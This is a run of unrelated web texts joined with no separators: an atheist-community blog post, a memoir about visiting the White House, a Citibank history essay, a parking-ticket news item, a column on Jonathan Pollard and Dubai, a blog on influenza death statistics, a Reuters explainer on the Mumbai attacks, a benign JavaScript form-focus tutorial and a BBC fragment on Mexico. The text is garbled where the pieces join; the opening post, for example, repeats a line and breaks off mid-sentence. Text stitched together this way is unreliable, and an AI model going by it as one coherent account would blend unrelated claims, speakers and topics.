For example , do we want a broad secular community that might include atheists , agnostics , humanists , freethinkers , etc. , or should we limit our initial efforts to fostering atheist community ?
This is an important question , and not an easy one to answer .
Perhaps we could even do both simultaneously , conceptualizing our task as involving parallel efforts operating at different levels of inclusion .
To begin the discussion about what sort of community we should try to foster , I offer the following recommendations :
Even though a broad secular community ( i.e. , atheists , agnostics , humanists , freethinkers , etc. ) may be our ultimate goal , we should start with building atheist community .
One of the more important initial steps should involve atheist identity , educating our fellow nonbelievers about the meaning of atheism and giving them something with which to identify .
Initial efforts to develop atheist community should emphasize common political concerns where support is likely to be nearly unanimous ( e.g. , preserving separation of church and state , opposing religious extremism , ending informal religious tests for political office , opposing anti-atheist bigotry , etc. ) .
When encountering resistance from our fellow nonbelievers , we should frame the issue as one of ensuring political representation .
I 'll end with a quote from Each of these recommendations is likely to be controversial , and each could easily be the subject of considerable discussion .
My hope is that by throwing them out there , some of this discussion will happen .
I 'll end with a quote from PZ Myers worth remembering :
And at the same time , as skeptics and science - minded people , the principles of tolerance we adopt are going to have to include frank disagreement and criticism of ourselves and others .
That should be a central part of who we are , that we do not muzzle our ideas and that we can go up to our fellow atheists and say , " you 're wrong " on just about anything , but without simultaneously implying that they 're going to be ostracized from the community .
It has been clear to me for some time that we need a secular community , and I am happy to see others making similar arguments .
I have called on my fellow atheist bloggers to begin the task of cataloging options for uniting nonbelievers .
I think it is time to again pick up this task and move forward in building community among atheists .
This post will serve as a reorientation to the task and attempt to outline some characteristics of the sort of community I think we need .
My goal here is not to persuade but to spark greater dialogue .
It ’s June 2001 .
I ’m 22 years old and have been sitting at the intersection of 14th Street and Pennsylvania Avenue in Washington , D.C. , for 15 minutes .
It ’s raining , hard .
I ’m in the first car I ’ve ever owned , a navy - blue Jeep Cherokee with more than 200,000 miles on it .
There ’s less than a quarter tank of gas left and it needs to last until Friday , because my entire net worth is rattling around the sticky change holder next to the emergency brake .
Yesterday the tailgate window mysteriously dislodged itself , and through the rearview mirror I notice rain pouring inside — proof that duct tape ca n’t solve everything .
I can also hear the front fender rocking back and forth in the back seat .
I ’ve intended to fix it ever since someone found it on Christmas morning near the 18th green at a country club in Connecticut .
I have also intended to cure myself of a propensity for driving my car into stationary objects while intoxicated .
The dashboard clock clicks from 5:58 to 5:59 , which means it ’s actually 5:46 , which means it ’s time to leave the intersection of 14th Street and Pennsylvania Avenue .
I take a deep breath , flick my cigarette out into the rain , and turn left .
Toward the east entrance of the White House .
Last month I graduated from Yale and moved to Washington , D.C. , to start a band with my best friend , Jeff .
Other than Jeff , the only person I know in this city is Barbara Bush , daughter of George W. and Laura Bush .
As it turns out , I ’m one of the few people Barbara knows here , since her family recently relocated from Austin , Texas , after her father was elected the president of the United States of America .
Barbara and I met about a year ago at a party in my apartment in New Haven .
We had a similar fondness for drinking alcohol and eating Kit-Kats and quickly became friends .
We also both enjoyed watching Ally McBeal , which saved me the trouble of telling her I was gay .
Ours was a strange bond , but one we both enjoyed — and one she apparently missed — because this afternoon she invited me to her house to have dinner and watch a movie .
“ My parents eat on the early side , so can you come over around six ? ” she asked .
“ Yeah , sure , ” I said , unsure .
“ I ’ll finish up work at five , grab my dry cleaning , and come over to your place . ”
Your place .
What an odd way to refer to the White House .
My windshield wipers have packed it in for the night , making it difficult to determine exactly where the visitor ’s - entrance checkpoint is .
I roll to a sudden stop as a heavily armed guard and a man in a black suit step in front of my car .
The sight of metal detectors and dogs reminds me that I am carrying one half of a marijuana cigarette in my Camel Lights pack .
I hand the Man in a Black Suit my expired Connecticut driver ’s license , and he returns to the security hut while the Heavily Armed Guard motions for me to unlock the trunk .
He opens the liftgate to reveal the following : three weeks of dry cleaning I intended to drop off earlier that day , one rusty front fender , a half case of warm beer from a camping trip I took two months ago , and a couple dozen harmonicas , which , at first glance , look a lot like pocketknives .
“ I was in an accident .
And I play the harmonica — they ’re harmonicas . ”
The guard shakes the fender a couple of times , nods at me , and shuts the liftgate .
As he does , the remains of the duct - tape adhesive give way and the rear windshield falls away from the car .
Miraculously , the Heavily Armed Guard manages to catch the glass in mid-air and positions it back on the tailgate .

The idea that Citigroup could support the family by gambling did n’t begin with Robert Rubin .
It ’s part of a long tradition .
What was different in the most recent go - round is that , this time , Citi did n’t invent the game .
Of course , once it got to the casino it characteristically placed larger bets than anyone else .
Word that Citigroup is teetering on the brink of break up brings a certain wistfulness to this former Citibank speechwriter .
Not because intensive care is something new for the old bank — it is n’t — but because it ended up on life support by following the crowd instead of leading it .
For well over a century , Citigroup and its precursors — First National , the City Bank of New York , First National City , Citibank , and Citicorp — were innovators .
They did n’t just overdo the fad of the moment , as they have done with mortgage - backed securities of one sort or another : they created it .
They led the Charge of the Light Brigade .
New York was America ’s imperial city , and Citibank was a vehicle for imperial vision by people who lacked imperial lineage .
When trade followed the flag to Latin America and the Philippines , Citi was there to count the cash .
The vision of the bank as a financial supermarket did n’t begin when Sandy Weill stepped into the picture ; it had its antecedents in the 1920s when Charles Mitchell , chairman of the National City Bank , merged commercial and consumer banking with his “ bank for all ” .
His vision that was still ruffling feathers six decades later , when senior vice - president Eben Pyne bitterly told me , “ Charles Mitchell ruined my grandfather ’s bank [ Farmers Loan and Trust ] , and they ’re doing the same thing now with these credit cards . ”
After acquiring Grandpa Percy ’s FL&T for its retail customer base , National City stuffed customers accounts with speculative paper from Latin America .
Think Bernard Madoff with widows and orphans .
Walter Wriston was CEO when I arrived at Citi in 1980 .
Walt used to say that when he entered banking soon after World War II , it seemed like the embodiment of everything dull .
Over his next years as Citicorp Chairman , he would certainly turn up the excitement .
He pioneered the negotiable certificate of deposit , shepherded the career of consumer banking king John Reed , and above all attacked the regulatory and legal regime that had been erected during the Depression , all under the watchful eye of a portrait of Austrian economist Frederich Hayek on his office wall .
The strategy that emerged late in his tenure was known as the “ Five I ’s ” : institutions , individuals , investments , insurance , and information .
They wanted to do it all .
And to do it , Citi needed to create a level playing field .
Other institutions not regulated as banks could perform bank - like functions , while banks could n’t reciprocate .
Merrill Lynch ’s money market accounts , which offered interest along with checking privileges , were a case in point .
The deregulation campaign provided plenty of work for the speechwriting team .
Ronald Reagan ’s first term , when Adam Smith neckties were all the rage , was a propitious time to turn up the heat .
The anti-regulatory fever that we were doing our utmost to spread was more reasonable then than many people now credit .
At the time , we liked to remind everyone that the prohibition against interstate banking dated from an era when people traveled by horse .
Under unitary banking laws then current in Texas , for example , each standalone ATM required incorporation as a bank .
The commercial market allowed corporations with excess cash to lend to other corporations by way of Wall Street , bypassing the banks .
It seemed as though any financial company that did n’t have a bank charter was free to poach on bank territory , while we had our hands tied .
Citibank was constantly challenging these constraints , legally , operationally , and , happily for me , rhetorically .
Some of the ideas were just plain dumb .
One was a travelers - checks - by - mail scheme that would allow consumer deposits to be collected across state lines .
What was missing was any sense that consumers could actually be induced to do business this way ; one thing I did learn at Citibank was that consumer behavior often failed to keep up with the brilliance of these innovators .
There was a pervasive feeling that Wall Street ’s profits were unjustifiably high , and that we should be allowed to compete .
We needed the regulatory freedom to enter each new line of business that just was n’t there for banks .
If Merrill Lynch could offer interest - bearing checking accounts and Sears could issue credit cards and sell insurance , why should n’t we sell mutual funds and insurance policies in our branches ?
We had machines to do mindless tasks like taking deposits and dispensing cash ; why should n’t we use our people to do things that only people can do ?
But as we achieved some of our legal and regulatory goals , the true prize only receded .
The head of our private banking division once confided in me , for no good reason , “ Do you know how hard it is to beat the S&P 500 day after day ? ”
Citibank was discovering , yet again , that it ’s hard to make a whole lot of money in banking all the time unless you ’re smart and nimble enough to adjust to changing economic circumstances .
Citibank was nimble of mind but slow of foot .
Profitability depended on finding an occasional niche and driving a truck through it , whether it was lending to Latin America , commercial real estate , or credit cards .
At some point , John Reed told us that Citibank was a credit card company with six or seven [ unprofitable ] lines of business .
At other times the investment did n’t pay off at all .
Remember Quotron , the dominant player in desktop information for brokers around the world ?
Even the bank ’s own due diligence showed that it was n’t worth the $ 1.5 billion price tag .
But we wanted to buy market share in that fifth “ I ” , the financial information business .
This transaction made Daimler ’s acquisition of Chrysler look like the Louisiana Purchase .
At the time , there was a former trader named Bloomberg just entering the picture .
Within a couple of years , it was his name , not Quotron ’s , that sat on every trading desk in the world .
In the early 1990s , as its stock fell below $ 10 , necessitating a Saudi bailout , Citibank abandoned one of its most cherished traditions , the continuous payment of dividends for more than 100 years .
A tradition sustained for many years , as it turns out , by borrowed money , not earnings .
Fast forward to this week : a lead headline in the New York Times business section reads , “ Citigroup Plans to Split Itself Up , Taking Apart the Financial Supermarket ” .
The playing field is now level .
Bear Sterns , Lehman Brothers , Merrill Lynch , and Citi have all been leveled by their gambles in the same lousy securities .
Citibank was always a bi-polar kind of place .
It alternated eras of rash and brash with periods of sober and staid , sometimes with new senior management and sometimes with the same team that created the mess to begin with .
For now , the mania is over .
Current CEO Vikram Pandit , described in the press as a technocrat , has put Smith Barney up for sale .
It ’s back to basics .
Both Grandpa Percy Pyne , and now Grandson Eben , can take time out from turning over in their graves for a little schadenfreude .
If we ’re lucky , Citigroup will be just a bank … until the next time .
Henry Ehrlich is a footnote to the financial history of our time .
He was a senior speechwriter for Citibank for 11 years , where he served the great , the near great , and the not so great .
Among other things , he wrote every speech for the senior bank negotiator during the early years of the 1980s LDC debt crisis .
He is author of Writing Effective Speeches and The Wiley Book of Business Quotations .
“ It ’s not like we rolled it out and everyone came running in for hearings , ” said Mary Gotsopoulis , the chief administrative law judge for the city ’s Parking Violations Bureau , which adjudicates tickets .
Chris Nellen , an unemployed copywriter , said if he had known about the program he would have challenged a ticket he received on Oct. 24 .
Mr. Nellen , 40 , said he had pulled his gray 2008 Toyota into a space near his girlfriend ’s house in Park Slope , Brooklyn , that morning .
He had not gotten a ticket in years and had not seen a sign down the block prohibiting parking for street cleaning from 7:30 to 8 a.m. , so he said he was shocked to find a $ 45 ticket on the car when he returned .
But he paid the ticket ( and a $ 2 service fee ) without protest to avoid further frustration .
Mr. Nellen said he did not think a possible fine reduction was worth waiting for a hearing with a judge .
But had he known an automatic reduction by a clerk was available , it would have been different .
“ If I could walk in and walk out , absolutely ! ” he said .
Ms. Gotsopoulis said that the efficiency of the hearing system has improved because a large slice of those who once waited for judges are now being dealt with by clerks , reducing the waiting time .
“ You can come in during your lunch time and get service within that hour , ” she said .
“ Prior to the settlements , hearings by mail took a number of months before you would get decisions .
Now , you can get a decision in two to four weeks . ”
The clerks who work in the settlement program use a set schedule of fine reductions , which are tied to the severity of the infraction .
For certain tickets , like parking at a fire hydrant , no settlement is possible .
People who challenge a ticket by mail , or online , are given the same option after they request a hearing .

Poor Jonathan Pollard Robert Eringer January 24 , 2009 12:00 AM
Spare a thought for poor Jonathan Jay Pollard , the U.S. Navy intelligence analyst who passed national security secrets to the Israelis two decades ago .
He and his supporters had hoped , perhaps even expected , a presidential pardon or commutation of his prison sentence as George W. Bush prepared to leave office earlier this week .
Despite a huge lobbying campaign that jammed the White House switchboard , this notorious spy remains behind bars .
Poor Jonathan Pollard .
Never one to show remorse for his dirty deeds , he still clings to a delusion that he was merely assisting an ally who had the right to know U.S. defense secrets .
He uses this rationalization to mask a sociopathic mind and 007 complex -- a lethal combination in intelligence work .
" Pollard is a narcissist , " Ronald Olive told The Investigator .
Mr. Olive , a retired Naval Investigative Service counterintelligence officer , should know .
Not only did he write the definitive book on the Pollard case ( " Capturing Jonathan Pollard , " Naval Institute Press , 2006 ) , he was intimately involved in the investigation that brought Mr. Pollard to justice .
" He set out to be a spy , " said Mr. Olive .
" It did not matter for whom .
It was all about him .
It just so happened that Israel took him on . "
Early on , Mr. Pollard displayed many signals about his instability .
Sadly , his colleagues and superiors at the Naval Fields Operational Intelligence Office put his odd behavior down to " eccentricity , " even though he carried a courier card that allowed him access to top - secret documents from a full spectrum of intelligence agencies , including the Central Intelligence Agency , National Security Agency , and Defense Intelligence Agency .
For instance , soon after receiving his clearance to be an analyst , Mr. Pollard ludicrously proposed creating a backchannel collection operation against the South African government through the naval attachè at the South African embassy , while lying that his father , Morris Pollard , had served in the CIA .
On other occasions , he would arrive late to meetings , sweating and disheveled , and announce that Irish terrorists had kidnapped his wife ; that he'd spent the weekend chasing them around Washington , D.C. , to negotiate her release .
The CIA had earlier rejected Mr. Pollard 's application for employment after he admitted extensive use of illegal drugs .
Later , when naval intelligence conducted a pre-employment security check on Mr. Pollard 's background , the CIA would not reveal why they had shown him the door , on the erroneous assumption that it would violate his right to privacy .
And then , when Mr. Pollard was finally caught red -handed improperly removing classified material from his office , the FBI wanted to fob off doing anything about it because they were too busy on other matters .
Poor Jonathan Pollard passed more secrets to a foreign power ( 360 - plus cubic feet of paper ) , in the shortest amount of time , than any spy before or after him .
He did so for a mere $ 2,500 a month and a couple first - class trips to Israel and Europe .
The Israelis also paid for his wife 's engagement ring .
But mostly Mr. Pollard spied to exercise his 007 complex and fuel his mammoth ego .
In exchange for Mr. Pollard 's cooperation to conduct damage assessment , the prosecution agreed not to press for life imprisonment .
Mr. Pollard , and his wife and co-conspirator , Anne , then breached the agreement by speaking to the media .
Prosecutors nonetheless remained true to their word and did not demand a life sentence .
Judge Aubrey Robinson , however , was under no such constraint .
Confronted with the breadth of this spy 's treachery , the judge , in 1987 , sentenced Mr. Pollard to life imprisonment with the possibility of parole .
Sentencing guidelines dictate that Mr. Pollard will be set free in 2015 .
President Clinton almost pardoned Mr. Pollard in 1998 under pressure from Israel , whose leaders took more than 10 years to officially admit he spied for them .
Brazen
Bill was not one to shy away from pardons of impropriety ; indeed , he pardoned Marc Rich on the last day of his presidency after the fugitive 's ex-wife , Denise , donated hugely to the Clinton Library .
But on Mr. Pollard , even Bill balked after CIA Director George Tenet got wind of it and threatened to resign if this traitor were set free .
Mr. Tenet represented the intelligence community 's view that those who betray their country should serve their full sentence .
So spare a thought for poor Jonathan Pollard , languishing away at Butner Federal Correctional Institution in North Carolina .
Think of how much he deserves a prison cell .
Think of him sitting there , craving more attention .
Other traitors , Aldrich Ames and Robert Hanssen , will never be set free .
Their life sentences mean life .
And since espionage is now a capital offense , they 're fortunate to have copped a plea that evaded execution .
So what does the future hold for Jonathan Pollard ?
Well , seven more years of prison .
And after 2015 ?
" He will undoubtedly move to Israel and try to claim back - pay he believes the Israelis owe him , " Mr. Olive told The Investigator .
" He thinks he is a hero in Israel .
He has built up a support base there , and I fully expect he will run for a seat in the Knesset ( Israeli parliament ) -- and win . "
In other words , for allowing Mr. Pollard to spy for it , resulting in its huge embarrassment when he confessed , Israel will finally get what it most deserves .
__________ Dubai :
The end of " world headquarters " ?
A hot tip from within the international intelligence community : " Dubai is a giant ponzi scheme that will make Bernie Madoff look like small change .
Many rich and famous people will lose a major packet . "
Now that the tarnishing has begun , the so - called City of Gold may need a new nickname : Copper Country .
Dubai's ruler " Sheik Mo " lured multinationals to headquarter in his " global financial center " with huge tax - free advantages -- and snared investment money , too .
Most of the development resulting in the world 's tallest buildings was financed by foreign loans that cannot now be repaid because of rapidly falling real estate prices .
Construction on the Nakheel Tower , which , if ever built , would be the world 's tallest building , has come to a complete halt ; its parent company fired 15 percent of its workers , most of whom are foreigners who cannot legally remain in Dubai more than 30 days without jobs .
This is not an isolated case , but a growing trend in Dubai .
More ominous , if one gets into a business dispute with Sheikh Mo , who owns a chunk of everything , it 's curtains .
An American private equity firm called Capital Partners just discovered this the hard way , having contracted to build a $ 1.3 billion development on a 38 - acre parcel .
When conflict arose , Sheik Mo simply " de- registered " the firm without warning , preventing it even from liquidating its assets .
" Dubai does n't have anything , not even oil , " another intelligence source told The Investigator .
" Real estate is crashing -- home prices , 8 percent last quarter -- on top of which their buildings are very poor quality .
When it occasionally rains , the roof leaks .
Furthermore , you can't walk anywhere and traffic is horrendous . "
The health of Dubai 's banks is also in question , along with its tourism prospects .
Six - year jail terms for sex on the beach in this Moslem Emirate seems to finally be having a negative effect on holidaymakers looking for fun in the sun .

How do we know what we know ?
It is said by some anti-vaccine proponents that vaccines are not needed because the diseases they prevent are either gone or no longer as severe as they were in pre vaccine times .
People may have suffered and died in the distant past , but no longer .
The risk now is from the vaccines not the diseases they no longer prevent .
36,000 people , more or less , die every year from influenza .
That is the number of deaths according to the CDC web site ; the NEJM review uses the higher number of 56,000 ( 7 ) .
Which number is correct ?
Is n’t that why the flu vaccine is recommended : to prevent all those people from dying .
36,000 is a lot of people .
That ’s about 120 deaths per million people in the US .
In Oregon , population about 3 million , that would be about 360 people a year , which is two deaths a day for the six month flu season .
“ Death is caused by swallowing small amounts of saliva over a long period of time . ” –George Carlin .
2,400,000 people die every year in the US , about 6600 a day .
In Oregon , that is about 65 deaths a day .
No one outside a epidemiologist is going to notice 2 extra deaths a day during flu season .
I have seen a lot of people die of influenza , but I have a biased experience : I am an infectious disease doc , so I am likely to see people with influenza , especially patients with disease severe enough to kill them .
About the same number of people die from car accidents and die from handguns in the US each year as die from influenza .
I have never known a person in my real , as opposed to my professional , life to die from influenza or handguns or a car accident .
My personal experience suggests no one dies from these causes , but since I take care of patients at one of the Portland trauma hospitals , I know what cars and guns do to people .
My professional life confirms that people do indeed die from being shot or car accidents .
I would wager that most people reading this blog have not known anyone who has died from influenza , guns or car accidents .
The fact that people do die of influenza seems contradicted by experience .
Why get the vaccine ?
I do n’t get the flu and and no one I know has ever died from it .
As an illustrative example , a relative of mine , a retired physician , mentioned that he thought the shingles vaccine was a waste of time and money as he had never known anyone to get shingles .
Using personal experience to judge disease prevalence is unreliable .
If I applied the same rationale to driving , I would not wear a seat belt as I have never been in a high speed crash .
36,000 people die of influenza each year .
What is the source of that statistic ?
From “ Mortality associated with influenza and respiratory syncytial virus in the United States ” .
JAMA 2003 .
Is that really how many deaths are there from influenza ?
It depends on what you mean by ‘ death ’ and what you mean by ‘ influenza ’ and what you mean by ‘ from ’ .
“ It depends on what the meaning of the words ‘ is ’ is . ” – Bill Clinton
Influenza deaths are an estimate .
A sample of a population is evaluated for a disease , like influenza , and the the results are extrapolated to the whole population .
The bigger the sample , the more reliable the extrapolation .
It is not a simple task to estimate disease prevalence .
How do you define a case of influenza ?
Most people with influenza do not get cultures to confirm the diagnosis .
What combination of cultures , rapid testing , serology and clinical syndrome do you use to define a case of influenza ?
There is a lack of precision in determining if influenza was the cause of death since many people with influenza do not have the tests done to prove the diagnosis .
Someone is admitted to the hospital with what starts as a febrile coughing illness and dies of heart failure and bacterial pneumonia .
The initial illness could very well have been influenza that set them down the road to death .
If you are interested in influenza deaths , you need to define what constitutes death from influenza .
Did they die directly from influenza ?
Did they die from secondary infections ?
Did they die from underlying diseases such as heart or lung disease that are worsened by the physiologic stress of influenza ?
To complicate matters , the US does not have a unified health care system and as a result deaths are not tracked uniformly .
You might be surprised at how difficult it is to accurately fill out a death certificate since people often die from multiple diseases .
Lets peruse the JAMA article to get a sense how influenza deaths are estimated .
How do they find that grain of sand that is influenza deaths from the mountain of routine mortality ?
Lets look at the reference in detail , because it gives insight as to how to determine influenza deaths in the US .
“ The doctors killed Garfield ; I just shot him . ” – Charles Guiteau .
“ Numbers of deaths attributable to influenza are difficult to estimate directly because influenza infections typically are not confirmed virologically or specified on hospital discharge forms or death certificates .
In addition , many influenza - associated deaths occur from secondary complications when influenza viruses are no longer detectable .
Nonetheless , wintertime influenza epidemics have been shown to be associated with increased hospitalizations and mortality for many diagnoses , including congestive heart failure , chronic obstructive pulmonary disease , pneumonia , and bacterial superinfections . ”
Here is how they arrive at an annual average of 36,000 influenza deaths .
First , they defined a time frame to evaluate : the respiratory season is July 1 to June 30 .
Second , find influenza cultures .
Positive cultures define a case of influenza .
They looked at all the influenza isolates reported to the CDC .
This is an underestimate of the amount of influenza as many cases of influenza are defined clinically and a a small fraction of suspected cases of influenza are confirmed with cultures .
Third , look at mortality from the National Center for Health Statistics .
They included “ the underlying cause - of - death because it represents the disease or injury that initiated the chain of morbid events that led directly to the death . ”
Why did they die ?
The US lacks a national data base for cause of death , so they used diagnosis codes rather than death certificate reports , which also has issues .
Every disease has an ICD - 9 code associated with it .
Fever is 780.6 .
HIV is 042 .
You know a doctor by the codes she has committed to memory from repeated use .
Diagnosis codes exist for billing purposes and the rigorousness with which a diagnosis is made is often less than perfect , limited by time and potential morbidity .
I could diagnosis every case of influenza if I could do an open lung biopsy on each patient , but that is not worth either the harm to the patient or the cost of the procedure .
Often the diagnosis code represents a best , but honest , guess as to what diseases a patient had .
“ The 3 death categories modeled were underlying pneumonia and influenza deaths ( ICD - 9 codes 480-487 ) , underlying respiratory and circulatory deaths ( ICD - 9 codes 390 - 519 and ICD - 10 codes ( I00 - I99 , J00 - J99 ) , and all - cause deaths ( all ICD codes ) . ”
Diagnosis codes are not an optimal way to know what the ‘ real ’ diagnosis was , but the best we have .
So we using a 2 megapixel camera to take a snapshot of influenza deaths , but the picture is going to be a reasonably accurate representation of the impact of the disease .
“ While the individual man is an insoluble puzzle , in the aggregate he becomes a mathematical certainty .
You can , for example , never foretell what any one man will be up to , but you can say with precision what an average number will be up to .
Individuals vary , but percentages remain constant . ” – Arthur Conan Doyle
Fourth , and final , part of the study is the application of magic .
Or statistical analysis .
Same thing to me .
They used an “ age - specific Poisson regression model that used weekly influenza circulation data . ”
Here is where I have to defer to people who have a deeper understanding of statistics as I thought a Poisson model would be fish counting in the Seine .
“ Poisson regression has been mainly applied to compare exposed and unexposed cohorts and to evaluate the clinical course of ill subjects ( 2 ) ” .
Sounds perfect .
That is what we want to do , so the statisticians appear to be using the right statistical analysis .
Here is another factor that could lead to lack of trust in the death rates from influenza : the processes by which these numbers are generated are really understood by a tiny fraction of the population .
It appears from reference ( 2 ) that the Poisson is a reasonable statistical analysis to apply to the question of the number of deaths from influenza , but I almost have to accept that proposition on the basis of faith given my bleak understanding of statistics .
So what did the analysis show ?
For the period in question there was an yearly average ( some years more , some years less ) of
69,140 deaths from pneumonia and influenza ,
1,135,724 deaths from underlying pulmonary or cardiac disease , and
2,126,740 deaths from all causes .
Applying the Poisson model to the data they looked at the deaths when influenza was circulating in the community and when influenza was not circulating in the community and compared the deaths .
They determined that on average there were
5977 deaths from pneumonia and influenza ,
25,420 deaths from underlying pulmonary or cardiac disease , and
34,470 deaths from all causes
could be attributed to influenza .
These were the extra deaths , by type , that occurred when influenza was circulating in the US .
See copywrited material here : http://www.sciencecartoonsplus.com/pages/gallery.php.
I feel the same way .
It is important to note that the flu does not kill most people directly , but indirectly through secondary infections or exacerbation of underlying chronic medical problems .
There is year to year variation in the number of deaths depending on the virulence of influenza , the effectiveness of the flu vaccine and the number of people protected by past exposure to the strain .
The dogma , as an aside , has been that during the 1918 pandemic most people died from acute influenza infection , as occurs with the current strain of avian influenza .
That may have not been the case , as an archeological epidemiologic study in Clinical Infections Diseases ( 8 ) suggests that deaths from secondary bacterial infections may have accounted for the majority of the deaths .
I keep drumming my fingers nervously on the table , waiting for the perfect infectious disease storm to hit .
If we have a bad influenza season combined with the new widespread MRSA strain , we could see a huge spike in deaths from secondary bacterial pneumonias from MRSA .
The current USA 300 strain is impressively virulent when it gains access to virus damaged lungs , killing patients in less than 48 hours , and I can’t reliably kill MRSA .
The JAMA study also demonstrated that the older you are , the more likely you are to die of influenza , that if the patient is > 85 years old , there is a 16 times higher chance of dying of flu than if they are less than 65 .
Short of a universal health care , where everyone is in a database with precise diagnosis , this kind of epidemiologic study is as good as we can do to determine how many people die from influenza .
The best way to determine death rates from influenza would be to take a defined population of people and routinely evaluate them by culture and serology through the flu season , see who developed the flu and determine who died as a result .
Not an ethical prospective study , but accomplished retrospectively in Tennessee nursing homes , where they had patients for a total of 81,885 person years and evaluated them for influenza .
In this population , most of which had multiple co-morbid conditions , when influenza was circulating there was associated increase in mortality of an extra 15 deaths / 1000 ( 3 ) .
If the US population were all similarly old and debilitated , then we would have over 4 million extra deaths a year from influenza .
Similarly , when influenza is circulating in the community , there is an associated extra 9 % of deaths in those with lung disease ( 4 ) .
There are other ways to determine deaths from influenza .
Deaths have been reported and influenza tracked since 1900 .
The onset of the influenza season has always been associated with an increase in death of all kinds .
Of course , until diagnostic tests were available , the diagnosis of influenza has to be taken with a grain of salt substitute .
Using historical reporting data you can get a rough idea of how often influenza kills .
This kind of data is an approximation ( 5 ) , but probably close enough to the truth to understand the impact of influenza .
The problem is knowing with reasonable assurance that the deaths were indeed due to influenza .
Given that limitation , over time deaths from influenza have fallen since 1900 from 10.2 deaths per 100,000 population in the 1940s to 0.56 per 100,000 by the 1990s .
That would be about 16,800 deaths directly from influenza each year , not including the secondary deaths from heart and lung diseases , more than the JAMA article , but they used different case definitions .
Using a similar methodology , it is estimated that influenza results in 365,000 or more hospitalizations each year ( 6 ) .
” An approximate answer to the right question is worth a good deal more than the exact answer to an approximate problem . ” — John W. Tukey
All the studies demonstrate the same basic principal : when influenza arrives , so does the grim reaper .
So how many people does influenza kill each year ?
16,000 ? 36,000 ?
56,000 ?
Even more ?
Or less ?
As you can see , it depends on how you do the counting .
All the studies put the number of deaths in the same ballpark .
One anti vaccine website says that influenza directly kills ‘ only ’ hundreds of people a year .
I think hundreds is a lot of people , especially as the deaths were preventable .
It is true that deaths directly from influenza are unusual .
It was a mild flu season last year , but 76 children died directly of influenza , all unvaccinated , and the number of deaths is probably an underestimate given the current surveillance system .
I could not find a number for adult deaths last year at the CDC site .
“ A single death is a tragedy ; a million deaths is a statistic . ” — Joseph Stalin
By our best estimates , influenza , one way or another , kills 36,000 people in the US every year .
36,000 stacked corpses would make column 6 miles high .
Many of those deaths were preventable with the flu vaccine .
Every death was a tragedy .
For many people influenza is like being pushed off a cliff .
Neither the push ( the flu ) nor the fall ( underlying condition ) kills you .
It is the sudden stop .
Next time : how effective is the influenza vaccine ?

MUMBAI ( Reuters ) - Militants armed with automatic weapons and grenades attacked luxury hotels , hospitals and a famous tourist cafe in India ’s commercial capital Mumbai late on Wednesday , killing at least 101 people .
* WHO IS BEHIND THE ATTACKS ?
The attacks were claimed by a previously unknown group calling itself the Deccan Mujahideen in an e-mail to news organizations .
Deccan is an area of southern India .
But it is not clear if the claim is genuine , and analysts say the bombings are almost certainly the work of a different group .
The most likely perpetrators , they say , are either the Indian Mujahideen or Lashkar - e - Taiba .
* WHO ARE LASHKAR-E-TAIBA ?
Lashkar - e- Taiba is one of the largest Islamic militant groups in South Asia , based in Pakistan and fighting Indian rule in Kashmir .
Security analysts say it is a well - funded and highly organized group that sympathizes with al Qaeda .
Lashkar - e- Taiba denied being behind the Mumbai attacks and said it condemned them .
The group was blamed for bomb attacks on markets in New Delhi that killed more than 60 people in 2005 , as well as an assault on India ’s parliament in 2001 that brought India and Pakistan to the brink of a fourth war .
* WHO ARE THE INDIAN MUJAHIDEEN ?
Indian police say the Indian Mujahideen is an offshoot of the banned Students ’ Islamic Movement of India ( SIMI ) , but that local Muslims appear to have been given training and backing from militant groups in neighboring Pakistan and Bangladesh .
SIMI has been blamed by police for almost every major bomb attack in India , including explosions on commuter trains in Mumbai two years ago that killed 187 people .
Police said the Indian Mujahideen may also include former members of Bangladeshi militant group Harkat - ul - Jihad al Islami .
The group first emerged during a wave of bombings in the northern state of Uttar Pradesh in November 2007 , sending an e-mail to media outlets just before some of the bombs exploded .
They have since claimed responsibility for multiple bomb attacks in Jaipur , Bangalore , Ahmedabad and New Delhi .
* WHO DOES INDIA BLAME ?
Indian Prime Minister Manmohan
Singh said the attacks were probably plotted by a group based in a neighboring country .
But Indian governments often blame neighboring Pakistan or sometimes Bangladesh for supporting or harboring militant groups which have launched attacks on Indian soil .
* WHAT CAN BE INFERRED FROM THE ATTACKERS ’ TACTICS ?
The Mumbai attacks were unusual in that they involved coordinated attacks by gunmen on multiple targets , hostages were taken , and foreigners were specifically targeted .
Several analysts say these tactics point to Lashkar - e - Taiba as being involved .
The attacks on symbolic targets designed to gather maximum publicity , and the specific targeting , point to a group following al Qaeda ideology and tactics .
The attacks also show a considerable degree of sophistication , another factor pointing to an experienced group like Lashkar - e - Taiba .
The Indian Mujahideen have also surprised police with the sophistication of their attacks , however , although until now these have always been bomb attacks on Indian targets .
In May , the Indian Mujahideen made a specific threat to attack tourist sites in India unless the government stopped supporting the United States in the international arena .
The threat was made in an e-mail claiming responsibility for bomb attacks that killed 63 people in the tourist city of Jaipur .
The mail declared “ open war against India ” and included the serial number of a bicycle used in one of the bombings .
* WHAT CAN BE INFERRED FROM THEIR DEMANDS ?
A man speaking Urdu with a Kashmiri accent phoned an Indian TV station , offering talks with the government and accusing the Indian army of killing Muslims in Kashmir .
This suggests the attackers are involved with a Kashmiri group like Lashkar - e - Taiba .
The demands of the Indian Mujahideen -- like their targets -- have always tended to be much more domestic .
The group issued an e-mail threat in September to attack Mumbai but directed its anger at the Mumbai police anti-terrorist squad , accusing them of harassing Muslims .
“ If this is the degree your arrogance has reached , and if you think that by these stunts you can scare us , then let the Indian Mujahideen warn all the people of Mumbai that whatever deadly attacks Mumbaikars will face in future , their responsibility would lie with the Mumbai ATS and their guardians , ” it said .
Here I ’m explaining how to focus cursor to a text field on page load .
You can do this with several methods with a simple javascript code .
For this , you have to put a name for your form and your text filed .
See the sample form below .
< form name = " myForm " method= " post " action= " " >
< label >
< input type =" text " name = " username " />
</label >
< label >
< input type =" submit " name = " Submit " value = " Submit " />
</label >
</ form >
Now just look on the code .
You can do this with a single line code within body onLoad .
< body onLoad=" document.myForm.username.focus ( ) ; " >
You can call this code with a function like this :
< script >
function curFocus ( ) {
document.myForm.username.focus ( ) ;
}
</script >
< body onLoad=" curFocus ( ) ; " >
Another method is put the code inside the page after the form .
See how is it .
< script type =" text / javascript " language = " JavaScript " >
var focusCtrl = document. forms [ " myForm " ].elements [ " username " ] ;
if ( focusCtrl ) {
focusCtrl.focus ( ) ;
}
</script >

BBC News , Mexico City
There has been a surge in murders and kidnapping across the country
The Congress in Mexico has agreed to debate the issue of reinstating capital punishment for some crimes .
